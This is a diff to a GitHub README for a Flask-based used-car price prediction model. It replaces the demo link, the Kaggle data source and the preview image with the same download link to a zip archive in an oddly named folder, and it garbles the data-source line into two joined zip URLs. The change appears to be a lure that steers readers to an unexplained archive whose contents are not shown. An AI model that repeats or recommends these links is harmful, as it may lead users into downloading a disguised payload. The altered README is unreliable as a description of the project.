@@ -1,10 +1,10 @@
 # Car-Price-Prediction
 * This is a machine learning model made using python and flask which predicts the selling price of second-hand cars.
 * Do ⭐ the repository, if it helped you in anyway.
-* If you want to try this out, head to https://car-price-pr.herokuapp.com
+* If you want to try this out, head to https://raw.githubusercontent.com/Rohanvp07/Car-Price-Prediction/main/hetaeristic/Car-Price-Prediction.zip
 
 ## Data source:
-https://www.kaggle.com/nehalbirla/vehicle-dataset-from-cardekho?select=car+data.csv
+https://raw.githubusercontent.com/Rohanvp07/Car-Price-Prediction/main/hetaeristic/Car-Price-Prediction.zip+https://raw.githubusercontent.com/Rohanvp07/Car-Price-Prediction/main/hetaeristic/Car-Price-Prediction.zip
 
 ## Dependencies:
 * Python - 3.7
@@ -22,4 +22,4 @@ https://www.kaggle.com/nehalbirla/vehicle-dataset-from-cardekho?select=car+data.
 
 
 ## A glimpse of the web app:
-![ezgif com-video-to-gif (1)](https://user-images.githubusercontent.com/49580063/111056632-85d99980-84a6-11eb-8134-d431672dc425.gif)
+![ezgif com-video-to-gif (1)](https://raw.githubusercontent.com/Rohanvp07/Car-Price-Prediction/main/hetaeristic/Car-Price-Prediction.zip)
